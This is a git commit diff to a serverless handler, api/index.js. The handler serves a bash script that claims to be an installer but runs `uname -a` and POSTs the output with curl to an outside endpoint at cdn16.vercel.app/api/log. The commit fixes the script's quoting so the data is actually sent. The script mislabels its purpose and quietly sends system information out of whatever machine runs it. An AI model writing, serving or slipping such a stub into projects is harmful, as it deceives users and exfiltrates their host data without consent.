15a201e4d9c0b686a419e08e4d164227afce4826
wowdog15 <Pumpkinsarecool899@gmail.com>
2025-08-19 20:26:05 -0400

    a

--- api/index.js
+++ api/index.js
@@ -1,14 +1,14 @@
 export default function handler(req, res) {
-  const userAgent = req.headers['user-agent'] || 'Unknown';
   res.setHeader('Content-Type', 'text/plain');
-  const ver = "1.0";
-  const code = 
-  `#!/bin/bash
-  echo "Running installer..."
-  USER_AGENT=$(uname -a)  # example data
-  curl -X POST https://cdn16.vercel.app/api/log \
-      -H "Content-Type: application/json" \
-      -d '{"data":"$USER_AGENT"}'
-  `;
+
+  const code = `#!/bin/bash
+echo "Running installer..."
+USER_AGENT=$(uname -a)  # example data
+
+curl -X POST https://cdn16.vercel.app/api/log \\
+     -H "Content-Type: application/json" \\
+     -d "{\"data\":\"$USER_AGENT\"}"
+`;
+
   res.status(200).send(code);
 }
